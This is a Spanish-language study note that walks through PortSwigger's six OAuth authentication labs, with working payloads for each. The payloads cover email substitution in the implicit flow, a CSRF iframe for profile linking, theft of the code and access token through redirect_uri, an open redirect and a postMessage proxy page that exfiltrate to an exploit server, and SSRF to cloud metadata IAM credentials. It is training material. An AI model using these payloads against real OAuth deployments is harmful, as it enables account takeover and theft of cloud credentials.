---
aliases:
  - OAuth labs
  - oauth-labs
tags:
  - vuln/oauth
  - labs
  - portswigger
---

# OAuth authentication — Labs de PortSwigger

Labs de la categoría **[OAuth authentication](https://portswigger.net/web-security/oauth)**: **1 Apprentice + 4 Practitioner + 1 Expert** (6 en total). **El hilo común:** OAuth mete un **tercero** (el *authorization server* / proveedor social) en el login, y el **cliente** (el target) tiene que confiar en algo que viaja por ese flujo —un `code`, un `access_token`, o el **perfil** del usuario— para decidir *quién sos*. La vuln aparece cuando el cliente **confía sin verificar**: no chequea a **quién** pertenece el token, no valida **a dónde** manda el `code` (`redirect_uri`), no ata el flujo a tu sesión (`state`), o deja que **vos controles metadata** del cliente. Lo que controlás siempre: los **parámetros de `/authorize`** (`redirect_uri`, `response_type`, `scope`, `client_id`) y, a veces, los **datos de perfil** que el cliente POSTea de vuelta.

> [!note] Cuatro "sabores" de OAuth attack
> - **Confianza ciega en los datos del flujo** (implicit): el cliente arma tu sesión con el **email/perfil** que le pasás, sin verificar que el token sea de esa persona → cambiás el `email` y sos otro. Lab 1.
> - **Robo del `code`/`token` vía `redirect_uri`**: desviás **a dónde** el proveedor entrega el `code`/`token` (a tu exploit server, o rebotando por un **open redirect** / **proxy page** del propio cliente) → capturás la credencial de la víctima. Labs 3, 4, 5.
> - **Falta de `state` → CSRF de account linking**: sin `state` (o sin validarlo) forzás a la víctima a **vincular tu cuenta social** a su cuenta del target → después entrás vos como ella. Lab 2.
> - **SSRF por metadata del cliente** (OpenID *dynamic client registration*): registrás un cliente y ponés una URL tuya en un campo que el server **fetchea** (`logo_uri`) → SSRF a la metadata del cloud. Lab 6.

> **Cómo leer las columnas:** **En qué confía / qué controlás** = por qué existe la vuln en ese lab · **Técnica · qué necesitás** = cómo la explotás + herramientas externas (exploit server / open redirect / postMessage) · **Objetivo** = qué conseguís. Payloads completos → sección [Payloads por lab](#payloads-por-lab).

> [!tip] 📈 Diagramas de secuencia (vistazo rápido, con actores: atacante / víctima / exploit server / OAuth service)
> - Lab 1 → [[vulnerabilities/026-oauth/examples/001-implicit-flow-email-substitution|001 · implicit flow, sustitución de email]]
> - Lab 2 → [[vulnerabilities/026-oauth/examples/002-forced-profile-linking-csrf|002 · forced profile linking (CSRF)]]
> - Lab 3 → [[vulnerabilities/026-oauth/examples/003-account-hijacking-redirect-uri|003 · account hijacking por redirect_uri]]
> - Lab 4 → [[vulnerabilities/026-oauth/examples/004-steal-token-open-redirect|004 · robo de token por open redirect]]
> - Lab 5 → [[vulnerabilities/026-oauth/examples/005-steal-token-proxy-page|005 · robo de token por proxy page (postMessage)]]
> - Lab 6 → [[vulnerabilities/026-oauth/examples/006-ssrf-dynamic-client-registration|006 · SSRF por dynamic client registration]]

## Apprentice

| #   | Laboratorio                                                                                                                                              | En qué confía / qué controlás                                                                     | Técnica · qué necesitás                                                                                                                                                                          | Objetivo                                                                                    |
| --- | ------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- |
| 1   | [Authentication bypass via OAuth implicit flow](https://portswigger.net/web-security/oauth/lab-oauth-authentication-bypass-via-oauth-implicit-flow)     | **Implicit flow:** tras el login, el cliente POSTea tu **email/perfil** a `/authenticate` y **confía** en ese email para crear la sesión, sin verificar que el token sea tuyo. | **Cambiar el email en el POST:** logueás con tu cuenta social, interceptás el `POST /authenticate` (o `/authentication`) con `{email, username, token}` y **cambiás el `email` por el de la víctima**. Nada externo. | Loguearte como **`carlos`** poniendo su email en el POST del flujo implicit.                 |

## Practitioner

| #   | Laboratorio                                                                                                                                          | En qué confía / qué controlás                                                                                    | Técnica · qué necesitás                                                                                                                                                                                                                                                                       | Objetivo                                                                                                       |
| --- | -------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| 2   | [Forced OAuth profile linking](https://portswigger.net/web-security/oauth/lab-oauth-forced-oauth-profile-linking)                                    | **Falta `state`:** el endpoint de *attach social profile* liga tu cuenta social al target **sin CSRF token**.    | **CSRF de linking:** arrancás vos el flujo de "attach", **dropeás** el `GET /oauth-linking?code=...` (para que tu `code` no se gaste), y armás un PoC de CSRF en el **exploit server** que dispare ese GET con **tu** `code` en el navegador del admin logueado. Al visitarlo, **tu** cuenta social queda ligada a la del admin. | Ligar tu perfil social a la cuenta del **admin** → loguearte con tu social **como admin** → **borrar a `carlos`**. |
| 3   | [OAuth account hijacking via redirect_uri](https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri)                  | **`redirect_uri` no validado:** el server manda el `code` a la URL que le pidas.                                 | **Robo del `code`:** cambiás `redirect_uri` en `/authorize` por tu **exploit server** y le pasás el link a la víctima/admin (ya logueada en el proveedor). Su `code` cae en tu **access log**. Después completás `GET /oauth-callback?code=STOLEN` en tu browser → entrás como ella.            | Robar el `code` del **admin** vía `redirect_uri` → loguearte como admin → **borrar a `carlos`**.               |
| 4   | [Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect) | **`redirect_uri` whitelisteado por dominio + open redirect** en el blog. Flow **implicit** (`token` en el fragment). | **Rebote por open redirect:** el `redirect_uri` sólo acepta el dominio del cliente, pero encadenás un **open redirect** (`/post/next?path=...`, alcanzado con `..%2f` desde el callback) que rebota a tu server. El `token` viaja en el **fragment** (`#`) → tu página lo lee con `location.hash` y lo exfiltra. Necesitás **exploit server** + **open redirect**. | Robar el **access token** del admin → usarlo contra la API (`/me`) → sacar su **API key**.                     |
| 6   | [SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration) | **Dynamic client registration abierto** (`/reg`, sin auth): controlás metadata del cliente (`logo_uri`).         | **SSRF por `logo_uri`:** registrás un cliente nuevo por `POST /reg` con `logo_uri` apuntando a la **metadata del cloud**. Cuando el server intenta renderizar el logo (`GET /client/CLIENT_ID/logo`), **fetchea tu URL** → SSRF. Nada de exploit server; sólo el endpoint de registro. | SSRF a `169.254.169.254` → leer las **credenciales del IAM role** de la metadata (`admin`).                    |

## Expert

| # | Laboratorio | En qué confía / qué controlás | Técnica · qué necesitás | Objetivo |
| --- | --- | --- | --- | --- |
| 5 | [Stealing OAuth access tokens via a proxy page](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page) | **`redirect_uri` estricto** (sólo el callback del cliente), pero hay una **página del propio cliente** que filtra el fragment por **`postMessage`** sin validar el `origin`. | **Proxy page + web messaging:** apuntás `redirect_uri` a esa página "proxy" del cliente (pasa la validación exacta), la **iframeás** desde tu exploit server, ella recibe el `token` en el fragment y lo **`postMessage`-a a `*`** → tu página escucha el `message` y exfiltra el token. Necesitás **exploit server** (iframe + listener). | Filtrar el **access token** del admin vía la proxy page → sacar su **API key**. |

---

## Payloads por lab

> Los parámetros de OAuth se editan en Burp (Proxy/Repeater) sobre la request a `/authorize`. Reemplazá `LAB-ID`, `OAUTH-ID` (el subdominio `oauth-*.oauth-server.net`), `TU-EXPLOIT-SERVER`, `CLIENT_ID` y `STOLEN` por lo tuyo. El **borrado de carlos** (labs 2 y 3) suele ser el botón "Delete" del panel `/admin` una vez adentro.

**L1 — Auth bypass por implicit flow (cambiar el email en el POST):**
```
POST /authenticate HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/json

{"email":"carlos@carlos-montoya.net","username":"wiener","token":"TU-ACCESS-TOKEN"}
```
> Primero logueás con **tu** cuenta social ("Log in with social media") para capturar este `POST /authenticate`. Cambiás sólo el `email` por el de la víctima; el server confía en ese campo y te crea la sesión de `carlos`. El `token` puede quedar el tuyo (no lo revalida contra el email).

**L2 — Forced OAuth profile linking (CSRF sin `state`):**
1. Logueado como `wiener`, arrancás **"Attach a social profile"**. Interceptá y **forwardeá** hasta ver el `GET /oauth-linking?code=YOUR_CODE` — **dropealo** (no lo dejes llegar, para no gastar el `code`).
2. PoC en el **exploit server** (se lo servís al admin):
```html
<iframe src="https://LAB-ID.web-security-academy.net/oauth-linking?code=YOUR_CODE"></iframe>
```
> Cuando el admin (logueado en el target) abre tu página, su navegador dispara el linking con **tu** `code` → **tu** cuenta social queda atada a la cuenta del admin. Después "Log in with social media" con tu cuenta → entrás **como admin** → `/admin` → borrar a `carlos`.

**L3 — Account hijacking por `redirect_uri` (robar el `code`):**
```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://TU-EXPLOIT-SERVER.exploit-server.net&response_type=code&scope=openid%20profile%20email HTTP/1.1
Host: OAUTH-ID.oauth-server.net
```
> Ese link se lo entregás al admin (por el exploit server). Al abrirlo (ya logueado en el proveedor), su `code` cae en **tu access log**:
> ```
> GET /?code=STOLEN_CODE
> ```
> Lo usás en **tu** browser contra el callback real del cliente:
> ```
> GET /oauth-callback?code=STOLEN_CODE
> ```
> → sesión del admin. `/admin` → borrar a `carlos`.

**L4 — Robo de access token por open redirect (implicit + fragment):**
```
GET /auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://TU-EXPLOIT-SERVER.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email HTTP/1.1
Host: OAUTH-ID.oauth-server.net
```
> El `redirect_uri` pasa la validación (empieza con el dominio del cliente) pero por **path traversal** (`/oauth-callback/../post/next`) cae en el **open redirect** del blog, que rebota a tu server **arrastrando el fragment** (`#access_token=...`). Tu `/exploit` lee el hash y lo manda al log:
> ```html
> <script>
> if (!document.location.hash) {
>   window.location = 'https://OAUTH-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://TU-EXPLOIT-SERVER.exploit-server.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email'
> } else {
>   window.location = '/?'+document.location.hash.substr(1)   // reenvía el token a tu access log
> }
> </script>
```
> **Deliver to victim** → en tu access log aparece `GET /?access_token=STOLEN...`. Usás ese token: `GET /me` en el dominio del OAuth con `Authorization: Bearer STOLEN` → devuelve el email y la **API key** del admin.

**L5 — Proxy page + web messaging (redirect_uri estricto):**
> La `redirect_uri` sólo acepta el callback exacto del cliente, así que no hay open redirect que valga. Pero una **página del cliente** (la "proxy") recibe el fragment y lo reemite por `postMessage(..., '*')` sin validar `origin`. La iframeás y escuchás:
```html
<iframe src="https://OAUTH-ID.oauth-server.net/auth?client_id=CLIENT_ID&redirect_uri=https://LAB-ID.web-security-academy.net/oauth-callback&response_type=token&nonce=399721827&scope=openid%20profile%20email"></iframe>
<script>
window.addEventListener('message', function(e) {
  // e.data trae el fragment con el access_token → reenvialo a tu log
  new Image().src = 'https://TU-EXPLOIT-SERVER.exploit-server.net/?'+encodeURIComponent(e.data.data);
}, false)
</script>
```
> El iframe corre el flujo OAuth; el callback del cliente hace `postMessage` del fragment al padre (tu página), que lo captura y exfiltra. **Deliver to victim** → token del admin en tu log → `GET /me` con `Authorization: Bearer STOLEN` → **API key**.

**L6 — SSRF por OpenID dynamic client registration (`logo_uri`):**
```
POST /reg HTTP/1.1
Host: OAUTH-ID.oauth-server.net
Content-Type: application/json

{
  "redirect_uris": ["https://LAB-ID.web-security-academy.net/oauth-callback"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
}
```
> La respuesta te da un `client_id`. Disparás el fetch del logo (el server hace la petición SSRF a la metadata):
> ```
> GET /client/CLIENT_ID/logo HTTP/1.1
> Host: OAUTH-ID.oauth-server.net
> ```
> La respuesta del logo **es** el JSON de credenciales del IAM role (`AccessKeyId`, `SecretAccessKey`, `Token`) → esa es la solución.

---

## Atajos mentales / patrones

- **La pista de que hay OAuth:** botón *"Log in with social media"* / *"Attach a social profile"*, y en el tráfico un `GET /auth` o `/authorize` con `client_id`, `redirect_uri`, `response_type=code|token`, `scope`, y un `/callback` que vuelve con `?code=` o `#access_token=`. **Mirá el flujo entero en el Proxy history** antes de tocar nada.
- **`code` vs `token` (los dos grants):**
  - **Authorization code** (`response_type=code`): el server manda un `code` de un solo uso a `redirect_uri`; el cliente lo canjea por el token **por detrás**. Robás el **`code`** (labs 2, 3).
  - **Implicit** (`response_type=token`): el `access_token` viene directo en el **fragment** (`#`) de la URL de retorno. Robás el **token** y necesitás JS que lea `location.hash` (labs 4, 5). El implicit también habilita el **bypass por confianza en el email** (lab 1).
- **`redirect_uri` — la palanca central.** Probá, en orden:
  - **Sin validar** → apuntá directo a tu exploit server (lab 3).
  - **Validado por prefijo/dominio** → **path traversal** (`/callback/../open-redirect`) o subdirectorios para caer en un **open redirect** del cliente (lab 4). Emparenta con [[vulnerabilities/025-dom-based/labs/README|open redirect]].
  - **Validado exacto** → buscá una **proxy page** del cliente que filtre el fragment por `postMessage` sin chequear `origin` (lab 5).
  - Otros clásicos: `localhost`, subdominios, `redirect_uri` duplicado, `%23`/`&`/`#` para engañar el parser.
- **Falta de `state` = CSRF.** El `state` debe ser **impredecible y atado a tu sesión**. Si falta o no se valida → **forzás linking** de tu cuenta a la víctima (lab 2), o login CSRF. Misma familia que [[vulnerabilities/003-csrf/csrf|CSRF]].
- **Confianza en datos de perfil.** Si el cliente arma la sesión con el `email`/`sub` que le POSTeás (implicit) sin atarlo al token → **cambiás el email y sos otro** (lab 1). Regla: el cliente **nunca** debe confiar en datos de usuario que vengan del front; tiene que pedírselos al proveedor con el token.
- **OpenID / dynamic registration = superficie de SSRF.** Campos como `logo_uri`, `jwks_uri`, `sector_identifier_uri` son **URLs que el server fetchea** → SSRF a `169.254.169.254` (metadata AWS) u hosts internos (lab 6). Emparenta con [[vulnerabilities/007-ssrf/ssrf|SSRF]].
- **Entrega a la víctima:** todo lo que roba `code`/`token`/linking se **entrega por exploit server** (la víctima/admin logueada visita el link/iframe) — misma mecánica de víctima que CSRF/clickjacking/XSS entregado.
- **Objetivos típicos:** labs de `code` → **login como admin** → `/admin` → **borrar `carlos`**; labs de `token` (implicit) → usar el token contra `/me` para sacar la **API key**; lab OpenID → **credenciales del cloud** por SSRF.

> [!note] Ver también
> - **Punto de entrada (cómo explotar, agnóstico):** [[vulnerabilities/026-oauth/oauth|oauth]]
> - **Open redirect** (la munición para saltarse un `redirect_uri` whitelisteado) → [[vulnerabilities/025-dom-based/dom-based|DOM-based]] · [[vulnerabilities/025-dom-based/labs/README|labs open redirect]]
> - **CSRF** (falta de `state` en el linking) → [[vulnerabilities/003-csrf/csrf|csrf]]
> - **SSRF** (dynamic client registration por `logo_uri`) → [[vulnerabilities/007-ssrf/ssrf|ssrf]]
> - **Toma de cuenta** en general → [[vulnerabilities/029-authentication/authentication|authentication]] · [[vulnerabilities/028-access-control/access-control|access control]]
